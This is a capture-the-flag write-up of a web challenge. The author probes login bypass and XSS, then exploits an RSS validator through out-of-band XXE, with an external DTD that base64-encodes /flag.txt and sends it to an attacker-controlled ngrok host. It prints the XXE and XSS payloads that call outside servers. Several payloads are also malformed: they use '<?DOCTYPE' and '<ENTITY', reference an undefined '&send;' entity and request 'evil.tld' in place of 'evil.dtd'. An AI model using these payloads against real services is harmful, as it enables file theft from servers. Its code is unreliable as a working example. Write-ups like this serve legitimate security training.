---
title: Lake CTF '25-'26 Quals - Le Canard du Lac (Web 100) Writeup
date: 2025-11-30 14:12
category: writeups
tags:
  - web
  - xml
  - xxe
  - oob
  - ctf-writeups
---

![image](./writings/Lake-CTF-25-26-Quals-Le-Canard-du-Lac-Web-100-Writeup/description.png)

This was a straightforward web challenge — no source code provided, just a simple news website built by “hackers from Lake Leman.”
The description specifically mentions *no brute-forcing*, so I went in expecting some kind of logic bug.

Below is the full walkthrough of how I got the flag.

---

## Initial Recon

![image](./writings/Lake-CTF-25-26-Quals-Le-Canard-du-Lac-Web-100-Writeup/homepage.png)

The first thing I noticed on the homepage was an **Admin Panel** link.
Naturally, I checked for basic login bypass techniques (classic `' OR 1=1--`, direct-access routes like `/dashboard`, `/admin/dashboard` etc.).
Nothing.

Then I went to the **Contact** page.
Tried a few XSS probes to confirm if any input reflected to an admin panel for blind interaction:

- `<script>fetch('https://myserver')</script>`
- `<img src=x onerror="fetch('https://myserver')">`

No hits — no traffic coming back to me.

---

## RSS Validator — The Real Attack Surface

The **RSS Validator** page accepts *raw XML input* and parses it server-side.
That's instantly suspicious.

My first attempt was a quick LFI probe:

````xml
<!DOCTYPE test [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<rss><title>&x;</title></rss>
````

The server responded with **invalid XML**.
So no direct file read.

Next, I switched to an **Out-of-Band (OOB) XXE** probe:

````xml
<?xml version="1.0"?>
<?DOCTYPE a [<ENTITY %b SYSTEM "https://ngrok-server.tld">%b;]>
<rss version="2.0"><channel><title>x</title><description>&send;</description></channel></rss>
````

My server got the request.
At that point, it was clear: *this endpoint is XXE-vulnerable*.

---

## Setting Up the Payload

* a **Python HTTP server** to host a malicious `evil.dtd`
* an **ngrok tunnel** to expose it publicly

Screenshots:

![image](./writings/Lake-CTF-25-26-Quals-Le-Canard-du-Lac-Web-100-Writeup/ngrokserver.png)
![image](./writings/Lake-CTF-25-26-Quals-Le-Canard-du-Lac-Web-100-Writeup/pythonserver.png)

---

## `evil.dtd` (hosted on my Python server)

This DTD exfiltrates the internal flag file via OOB request:

````xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ngrok-server.tld/flag?b64=%file;'>">
%eval;
%exfil;
````

Replace `<my-ngrok-url>` with your actual endpoint.
I Base64-encoded the file contents to avoid breaking the URL.

---

## Injected XML Sent to RSS Validator

```xml

<?xml version="1.0"?>
<?DOCTYPE a [<ENTITY %b SYSTEM "https://ngrok-server.tld/evil.tld">%b;]>
<rss version="2.0"><channel><title>x</title><description>&send;</description></channel></rss>
```

Submitting this triggered the internal server to fetch my malicious DTD, expand it, and then send the contents of `/flag.txt` back to my ngrok endpoint.

---

## Flag Received

My server log showed an incoming request containing the Base64-encoded flag.
I decoded it:

````bash
$ echo "RVBGTHtsNGszX0xFTUFOX215c3RlcjFlc19AX2VwZmwhfQ==" | base64 -d
EPFL{l4k3_LEMAN_myster1es_@_epfl!}
````
---
